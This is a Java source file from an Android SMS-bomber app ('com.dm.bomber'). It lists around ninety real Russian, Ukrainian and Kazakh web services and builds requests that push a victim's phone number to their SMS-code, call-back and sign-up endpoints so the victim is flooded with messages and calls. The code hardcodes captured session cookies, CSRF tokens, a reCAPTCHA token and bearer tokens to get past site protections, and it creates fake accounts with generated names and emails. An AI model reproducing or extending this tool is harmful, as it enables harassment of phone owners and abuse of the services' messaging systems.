package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.HttpUrl;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class Services {
    public final static Service[] services = new Service[]{
            new Telegram(), new MTS(), new CarSmile(),
            new Eldorado(), new Tele2TV(),
            new Ukrzoloto(), new Olltv(), new ProstoTV(),
            new Zdravcity(), new Robocredit(), new Tinder(), new Groshivsim(),
            new Dolyame(), new Tinkoff(),
            new KazanExpress(), new FoodBand(), new Gosuslugi(),
            new Citimobil(), new HHru(), new TikTok(), new Multiplex(),
            new Ozon(), new MFC(), new EKA(), new OK(), new MBK(),
            new VKWorki(), new Magnit(), new SberZvuk(),
            new BApteka(), new Evotor(), new Sportmaster(),
            new GoldApple(), new FriendsClub(), new ChestnyZnak(),
            new MoeZdorovie(), new Boxberry(), new Discord(),
            new Citydrive(), new Metro(), new RabotaRu(),
            new Mozen(), new MosMetro(), new BCS(),
            new Stolichki(), new Mirkorma(), new TochkaBank(),
            new Uchiru(), new Biua(), new MdFashion(), new RiveGauche(),
            new XtraTV(), new AlloUa(), new Rulybka(),
            new Technopark(), new Call2Friends(), new Ievaphone(), new WebCom(),
            new MTSBank(), new Paygram(), new Tele2(),
            new SravniMobile(), new TeaRU(), new PetStory(), new Profi(),
            new BeriZaryad(), new PrivetMir(), new CardsMobile(), new Labirint(),
            new CallMyPhone(), new SberMobile(), new YandexTips(), new Choco(),
            new AptekaOtSklada(), new Dodopizza(), new AutoRu(),
            new SatUa(), new VapeZone(), new TakeEat(), new BibiSushi(),
            new Melzdrav(), new Fonbet(), new Grilnica(),
            new Aitu(), new Pizzaman(), new VSK(),
            new Soscredit(), new ChernovtsyRabota(), new Eva(), new Apteka(),
            new Kari(), new Modulebank(),

            new ParamsService("https://findclone.ru/register") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", getFormattedPhone());
                }
            },

            new ParamsService("https://www.citilink.ru/registration/confirm/phone/+") {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addPathSegment(getFormattedPhone() + "/");
                }
            },

            new Service() {
                private final String url = "https://site-api.mcdonalds.ru/api/v1/user/login/phone";
                private final Headers headers = new Headers.Builder()
                        .add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0")
                        .build();

                @Override
                public void run(OkHttpClient client, Callback callback) {
                    client.newCall(new Request.Builder()
                            .url(url)
                            .headers(headers)
                            .method("OPTIONS", null)
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("number", "+" + getFormattedPhone());
                                json.put("g-recaptcha-response", "03AGdBq24rQ30xdNbVMpOibIqu-cFMr5eQdEk5cghzJhxzYHbGRXKwwJbJx7HIBqh5scCXIqoSm403O5kv1DNSrh6EQhj_VKqgzZePMn7RJC3ndHE1u0AwdZjT3Wjta7ozISZ2bTBFMaaEFgyaYTVC3KwK8y5vvt5O3SSts4VOVDtBOPB9VSDz2G0b6lOdVGZ1jkUY5_D8MFnRotYclfk_bRanAqLZTVWj0JlRjDB2mc2jxRDm0nRKOlZoovM9eedLRHT4rW_v9uRFt34OF-2maqFsoPHUThLY3tuaZctr4qIa9JkfvfbVxE9IGhJ8P14BoBmq5ZsCpsnvH9VidrcMdDczYqvTa1FL5NbV9WX-gOEOudLhOK6_QxNfcAnoU3WA6jeP5KlYA-dy1YxrV32fCk9O063UZ-rP3mVzlK0kfXCK1atFsBgy2p4N7MlR77lDY9HybTWn5U9V");
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            client.newCall(new Request.Builder()
                                    .url(url)
                                    .headers(headers)
                                    .post(RequestBody.create(json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new FormService("https://hotkitchen-delivery.ru/user_account/ajax5sf257.php?do=sms_code", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "8(***)***-**-**"));
                }
            },

            new FormService("https://polza.diet/sessions", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("utf8", "✓");
                    builder.add("authenticity_token", "RDB0iQ+dXYBLIvabyeAnf2fYEYnaMoMwINvwl/CS6HRz467tucU+kT6I7QTl7aWebeX8Gqtg48NYUUif1NJL9g==");
                    builder.add("phone", format(phone, "+7+(***)+***+**+**"));
                }
            },


            new JsonService("https://loymax.ivoin.ru/publicapi/v1.2/Registration/BeginRegistration") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("login", getFormattedPhone());
                        json.put("password", "");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://oauth.av.ru/check-phone", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9");
                    builder.addHeader("X-CSRF-TOKEN", "1Z3KKbbDSRbhxw6ZbLVRWcmwVMIPKXej12lzJzbZ");
                    builder.addHeader("X-Ajax-Token", "5592b90ee98edbba757b233367431ad8e130b84cbeb2599262f0ebf957f36b68");
                    builder.addHeader("Cookie", "XSRF-TOKEN=eyJpdiI6ImsxRkJrRlZCaVpKRVwvbVQ4MVFvQXB3PT0iLCJ2YWx1ZSI6ImJhTmVDYzVMVFZGc0x4b29WXC9GbERlTjhZeGFtWXExU2RXWFFKYU1WcXR5cnVwVllERlpKUVFSdXNya2NlK0x5IiwibWFjIjoiMDk1MDUwZGY1OTA4ZjA0NzIwYmExMWZjMjI0OTY2OWRkOWZhMzA4NTA2ZDFlMTMxN2UzN2Y4MGYwODM5MDhhNSJ9; laravel_session=eyJpdiI6IlkxaWo2T1A3N3YxRVdWTXVPZlVrK3c9PSIsInZhbHVlIjoiNVV4Q2xpNWZqc0xZM2xLWVwvQlZDaDRLTnBsek55VU9PZVR4b2tZQ1IwZGhCNjBuM2JKZksxdW5hZkl5Mno3YWEiLCJtYWMiOiIwZGI1YWY0MDlkMThmYmVhMjY3OWYyNDE2NGNkMjNkY2RlMDhiOGFmYjYxN2FjOTNmZjUzMmJmNDBkMjViYThhIn0%3D; session-cookie=16bc57cb02c5bcb3cb1a64b9b4819f5bd9e22f03393befd1a63c45fc465f0f8c3e8caa34700c46c53b462402658dd41e; font=phone");
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Referer", "https://oauth.av.ru/");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://shop.vodovoz-spb.ru/bitrix/tools/ajax_sms.php", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new JsonService("https://api.ecomarket.ru/api.php", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "doRegisterOrRecover");
                        json.put("phone", format(phone, "+7-***-***-**-**"));
                        json.put("source", "web");
                        json.put("type", "call");
                        json.put("token", "bb1a2f29c78164dfb490dbae44594318");
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://kakvkusno.ru/local/ajax/login.php", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=Y0S7SX43yr67KfFUdRBED3MeJctJbrb5; INPUT_ORDER_PROP_43=8.00-14.00; INPUT_PAY_SYSTEM_ID=3; INPUT_DELIVERY_ID=2; INPUT_ORDER_PROP_42=03.12.2021; BITRIX_SM_GUEST_ID=26546592; BITRIX_SM_LAST_VISIT=01.12.2021%2020%3A26%3A19; BITRIX_SM_SALE_UID=136da0bab623179cd65b58817b5da0fd; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1638392340%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; INPUT_ajax_right=Y; INPUT_type=order");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("GET_CODE", "1");
                    builder.add("PHONE", format(phone, "+7(***)***-**-**"));
                    builder.add("CSRF", "32e2ae3fcf4a29e4ba5f78bb91f3c3a4");
                }
            },

            new JsonService("https://www.vprok.ru/as_send_pin") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "split_segment=8; split_segment_amount=10; XSRF-TOKEN=eyJpdiI6ImpnRVJoY0swSEVPSWtsa2JMWTJPVnc9PSIsInZhbHVlIjoiOXp0V3c4WTdUbE82U2czTTZ3dkpoNVd1T1J0YkpTNWI0c3JZdG10bVZKTFBPMmZ2a1F4Mjl5b2RETWl5ZjZvYzFkU1wvMkw1T2pPMjV0NVZYV1pYSk9BPT0iLCJtYWMiOiJiYTg1MjM2ZWQ0NGVjOTUyOTgyNzcyMDU3ZDY5MjY5NmYyNzgwNTQ0MmI1Y2Y1NzNiMmVhMWQ5ZjFmOTllMDRhIn0%3D; region=8; shop=2671; noHouse=0; fcf=3; _dy_ses_load_seq=17826%3A1638380585139; _dy_c_exps=; _dy_c_att_exps=; isUserAgreeCookiesPolicy=true; suuid=bcb02b51-0827-4b04-9723-8c80419b120b; aid=eyJpdiI6Im9PdUtnOUs4eEFncTBvRHB5R0oxS1E9PSIsInZhbHVlIjoiM0Vxa2xCd1dYeERhNVJBaE04TVlYQWVwTzlIYndHQ3ZsWFFxMjRZclg4RWlFeDBmQVwvUFdmUXBsTlNtS1VmWEFkSFJ6SXM5QVZNNmwzeGRwNk1PbEJRPT0iLCJtYWMiOiJkODE2MjBlMTI4MTIxNDRkYTVhM2NmMjYyMWUyNTFkNDQzYWM0ZTQ4MDZhYjNhYmM3NDNhMmJkODZjMjUwY2JkIn0%3D; luuid=bcb02b51-0827-4b04-9723-8c80419b120b; _dy_csc_ses=t; splitVar=test01-A");
                    builder.addHeader("X-CSRF-TOKEN", "QPhHmWEtMAoBeuKgULCeLtejbfvKD2n4yMKylL3T");
                    builder.addHeader("X-XSRF-TOKEN", "eyJpdiI6IjhJQkhaWWh6VEJ1SVhsZERPVk53eWc9PSIsInZhbHVlIjoiNzFsUjVOZFwvTVYrY0gxdzI4MklcL1FMS1FZUGh3OUZOcUZDdkZIQUJiOUZ5Q1VHMXd6SWptaTNQNmhCbnduT0NqVklhRFBDbXcrOG10ejVjZXIxK3RWZz09IiwibWFjIjoiZWU0NGFlYzVmZTQwOWMyYjkzNTlkNmQ0YzUxYjc4NmY3MTZiYzgwZjZlMmVlNWM5MzA2YmY1MDcxNmZkNzdkYyJ9");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new MultipartService("https://groupprice.ru/auth_phone/send_phone_token") {
                @Override
                public void buildBody(MultipartBody.Builder builder) {
                    builder.addFormDataPart("phone", "+" + getFormattedPhone());
                    builder.addFormDataPart("time_zone", "180");
                    builder.addFormDataPart("redirect_back", "");
                    builder.addFormDataPart("token", "");
                }
            },

            new FormService("https://chuck-family.ru/s/get-registration-confirm-code.json", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("register_phone", format(phone, "8+***-***-**-**"));
                    builder.add("register_name", getRussianName());
                    builder.add("register_birthday", "01.01.1981");
                    builder.add("", "");
                }
            },

            new ParamsService("https://vsem-edu-oblako.ru/singlemerchant/api/sendconfirmationcode", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("lang", "ru");
                    builder.addQueryParameter("json", "true");
                    builder.addQueryParameter("merchant_keys", "b27447ba613046d3659f9730ccf15e3c");
                    builder.addQueryParameter("device_id", "f330883f-b829-41df-83f5-7e263b780e0e");
                    builder.addQueryParameter("device_platform", "desktop");
                    builder.addQueryParameter("phone", format(phone, "+7 (***) ***-**-**"));
                }
            },

            new FormService("https://novayagollandiya.com/auth/?backurl=/personal/", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("component", "bxmaker.authuserphone.login");
                    builder.add("sessid", "624313ea9d90eac9093d49000c8e2dbf");
                    builder.add("method", "sendCode");
                    builder.add("phone", format(phone, "+7+(***)-***-**-**"));
                    builder.add("registration", "N");
                }
            },

            new JsonService("https://api.petrovich.ru/api/rest/v1/user/pincode/reg?city_code=rf&client_id=pet_site") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0");
                    builder.addHeader("Cookie", "SNK=124; u__typeDevice=desktop; geoQtyTryRedirect=1; u__geoUserChoose=1; qrator_msid=1638604580.330.8vox5jrGVn8JeE5a-f7j5tbrq8vdc6ae4kths8i52pi66kom8; u__geoCityGuid=d31cf195-2928-11e9-a76e-00259038e9f2; u__cityCode=rf; SIK=fAAAAHRZ8mRMMMkQ4zoJAA; SIV=1; C_o72-jqSdEZI2mxcQ9hjwCsP7WhI=AAAAAAAACEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8D8AAIDJKZjpQfJVD28tnILC3BseM5mEUbQ; ssaid=afa34f20-54d7-11ec-9e2a-e50833b98526; dd__lastEventTimestamp=1638604588417; dd__persistedKeys=[%22custom.lastViewedProductImages%22]; dd_custom.lastViewedProductImages=[]; __tld__=null");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://blanc.ru/api/sso/entrance/login") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phoneNumber", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://api.sunlight.net/v3/customers/authorization/") {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU", 7) {
                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("captcha", "");
                        json.put("phoneNumber", format(phone, "+7 (***) ***-**-**"));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://www.m-reason.ru/auth/", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-Requested-With", "XMLHttpRequest");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("sessid", "c717bc5eb39427003dc49a6e4f8b1675");
                    builder.add("action", "send_sms");
                    builder.add("PHONE", format(phone, "+7+(***)+***-**-**"));
                    builder.add("privacy", "on");
                }
            },

            new FormService("https://telephony.jivosite.com/api/1/sites/900909/widgets/OVHsL3W8hY/clients/17314/telephony/callback") {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("invitation_text", "");
                }
            },

            new ParamsService("https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0");
                    builder.addHeader("Referer", "https://www.raiffeisen.ru/promo/500/?utm_campaign=perfluence%7cpr:dc%7csp:cashback%7ctype:referral%7cgeo:russia%7cmodel:issue%7coffer:private%7caud:AAAAAEazJzK_u9lCZcabcA&utm_medium=affiliate&utm_source=perfluence&utm_content=PF13516&utm_term=f56cb6d037db79233e3ff66fbe70b375");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("number", getFormattedPhone());
                }
            },

            new FormService("https://www.traektoria.ru/local/ajax/authorize.php?action=2", 7) {
                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("phone", getFormattedPhone());
                    builder.add("bxsessid", "68eb9e074e9677e3a7a3b4620abdff29");
                    builder.add("lid", "tr");
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    String formattedPhone = format(phone, "+7 (***) ***-**-**");

                    JSONObject json = new JSONObject();
                    JSONObject user = new JSONObject();

                    try {
                        user.put("email", getEmail());
                        user.put("first_name", getRussianName());
                        user.put("is_subscribed", false);
                        user.put("password", getEmail());
                        user.put("phone", formattedPhone);

                        json.put("user", user);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    client.newCall(new Request.Builder()
                            .url("https://www.respublica.ru/api/v1/users/signup")
                            .post(RequestBody.create(
                                    json.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) {
                            JSONObject json = new JSONObject();

                            try {
                                json.put("user", new JSONObject().put("phone", formattedPhone));
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }

                            client.newCall(new Request.Builder()
                                    .url("https://www.respublica.ru/api/v1/users/login")
                                    .post(RequestBody.create(
                                            json.toString(), MediaType.parse("application/json")))
                                    .build()).enqueue(callback);
                        }
                    });
                }
            },

            new JsonService("https://api.magonline.ru/api/graphql") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("token", "3a4711a14672e7a56b2072f1e06f10f3a578e8d1-d697b32f5a10ee16e71d407721f181ca63b78931");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("query", "  mutation ($input: RequestPhoneVerificationInput!) {    requestSignInPhoneVerificationCode (input: $input) {  count  maxCount  resendTime  lifetime  isVerified}  }");
                        json.put("variables", new JSONObject().put("input", new JSONObject()
                                .put("phone", "+" + getFormattedPhone())
                                .put("force", false)));
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://05.ru/api/v1/oauth/code/send/", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Authorization", "Bearer 1f27b755-5b44-11ec-b968-12c0bc664a05");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addPathSegment(format(phone, "+7 (***) ***-**-**"));
                    builder.addQueryParameter("short", "true");
                }
            },

            new JsonService("https://kos-mart.ru/send_code.json?code_iso3=RUS") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-CSRF-Token", "346f6048925a05eed2bb00f6f2638c8698835b6b210d8008dd52434c9d3fd6db");
                    builder.addHeader("Cookie", "visitor=hAj8xSk%2BWTqzWzIVzg9YKxQC24hQ%2BovUq%2FINA%2FhzRcrK%2BDpmrxGgHS0YuXy8Vc2KhZncrn4A6eD4tWPPgeXAbbxpLgX8eiftIu6oW6nAMf4etxH12h%2Fkc3cSKHNYXyGqhplGMABzIWS%2BYhM2Yr4XOv78GGZ1--WklonPFjDt9ZXN1y--ft3u0Hj4RfSK%2BlicU8bHjw%3D%3D; csrf_token=hRtO1GjeLhMOne47Kqv55g1tOY0f81YZp6jDXqnsLCNAEVA5FQ3nu6EYSgTnhNqufOZ6PWAhYPokQX007NWP2P6v8sy0%2FibcO6Bpb2znkRE%2FVsWoLWpifQdUV1TQwn%2FDlFxdvHMYkM0SylJGyKCwUgp05X1TViDNmxxjihjFgRDu1jKNdv2a5TrRvqa%2BBIvg0s5vXvxOh7%2FiKzPAV2Ppl%2Fo%3D--%2FaKP69e2yjH62Z06--nePoBJumFNoxCckoj73AJQ%3D%3D");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("csrf_token", "346f6048925a05eed2bb00f6f2638c8698835b6b210d8008dd52434c9d3fd6db");
                        json.put("login", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new FormService("https://www.meloman.kz/loyalty/customer/createConfirm/", 7) {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("Cookie", "PHPSESSID=vpqcv1o4psr14aripnt2a728ao; region_id=541; region_just_set=1; _dyjsession=audqfsd8yyfd75iqwvk8j32eqtqo1vfa; dy_fs_page=www.meloman.kz%2Fcustomer%2Faccount%2Flogin%2Freferer%2Fahr0chm6ly93d3cubwvsb21hbi5rei9jdxn0b21lci9hy2nvdw50l2luzgv4lw%252c%252c; _dy_csc_ses=audqfsd8yyfd75iqwvk8j32eqtqo1vfa; _dy_c_exps=; _dy_soct=362831.602231.1639410140*398001.680451.1639410143.audqfsd8yyfd75iqwvk8j32eqtqo1vfa*477267.869366.1639410143; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=b2SMIQBgbkQmR4FF; mage-cache-sessid=true; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; section_data_ids=%7B%22customer%22%3A1639410141%2C%22cart%22%3A1639410141%2C%22gtm%22%3A1639410141%7D");

                    return super.buildRequest(builder);
                }

                @Override
                public void buildBody(FormBody.Builder builder) {
                    builder.add("form_key", "b2SMIQBgbkQmR4FF");
                    builder.add("success_url", "");
                    builder.add("error_url", "");
                    builder.add("un_approved_mobile", format(phone, "+7(***)***-**-**"));
                    builder.add("confirm_mobile_code", "");
                    builder.add("terms", "on");
                }
            },

            new JsonService("https://ogon.ru/v1/users/auth") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-App-Name", "Site");
                    builder.addHeader("X-App-Version", "1.0.341.2");
                    builder.addHeader("X-Domain", "https://ogon.ru");
                    builder.addHeader("X-Fingerprint", "f7b509dccd4c01019b3e5ca233a851bb");
                    builder.addHeader("X-Pragma", "ReK6+msei8Y7ssRIkKmkrSJERsntCFHPAXmr2XnD4Zs=");
                    builder.addHeader("X-Support-SDK", "false");
                    builder.addHeader("X-UUID", "3fc54ee8-149e-4677-bbb2-fe5b98912e79");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("phone_number", "+" + getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new JsonService("https://ciel.ru/client/registration/get-code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("X-CSRF-Token", "GmvqEcerItk8twA7vBScaTlA9WWC7S0ncA3fb0tXEqlXIthXvfkav3TUZnnwI8MwUhGFKtCBZ10UNI4WDGFU-g==");
                    builder.addHeader("Cookie", "fuid=61ba1835889d6; user_key=5a637b0471c9c6e3a03a78304fd7de3cf14fa78c0a981e319e46341c11d4c513a%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22user_key%22%3Bi%3A1%3Bs%3A40%3A%224b590ae70e9a6b5da428d63bc4504abbbdb1a64a%22%3B%7D; _csrf=e5e4d6997b96ac6cd5408ddb5c2d24930e74a66c92f48a4f80e84a5377ca4e11a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22MI2FzR8fHcfBL7_YkQpORlJzd9QyG6FS%22%3B%7D; PHPSESSID=vk8gs80kra59nhvqm716n4m6ou; visit=true");

                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("number", getFormattedPhone());
                        json.put("fuid", "61ba1835889d6");
                        json.put("ok", true);
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new ParamsService("https://cvety.kz/ajax/actions/get-auth-phone.php", 7) {
                @Override
                public void buildParams(HttpUrl.Builder builder) {
                    builder.addQueryParameter("phone", format(phone, "+7 *** ***-**-**"));
                }
            },

            new JsonService("https://cnt-vlmr-itv02.svc.iptv.rt.ru/api/v2/portal/send_sms_code") {
                @Override
                public Request buildRequest(Request.Builder builder) {
                    builder.addHeader("session_id", "24f8bbf7-60d3-11ec-b71d-4857027601a0:1951416:2237006:2");
                    return super.buildRequest(builder);
                }

                @Override
                public String buildJson() {
                    JSONObject json = new JSONObject();

                    try {
                        json.put("action", "register");
                        json.put("phone", getFormattedPhone());
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }

                    return json.toString();
                }
            },

            new Service(7) {
                @Override
                public void run(OkHttpClient client, Callback callback) {
                    String formattedPhone = format(phone, "+7 (***) ***-**-**");

                    client.newCall(new Request.Builder()
                            .url("https://madrobots.ru/api/auth/register/")
                            .post(new FormBody.Builder()
                                    .add("name", getRussianName())
                                    .add("lastName", getRussianName())
                                    .add("phone", formattedPhone)
                                    .add("email", getEmail())
                                    .add("city", getRussianName())
                                    .add("subscribe", "0")
                                    .build())
                            .build()).enqueue(new okhttp3.Callback() {
                        @Override
                        public void onFailure(@NonNull Call call, @NonNull IOException e) {
                            callback.onFailure(call, e);
                        }

                        @Override
                        public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                            client.newCall(new Request.Builder()
                                    .url("https://madrobots.ru/api/auth/send-code/")
                                    .post(new FormBody.Builder()
                                            .add("identifier", formattedPhone)
                                            .build())
                                    .build()).enqueue(callback);
                        }
                    });
                }
            }
    };
}
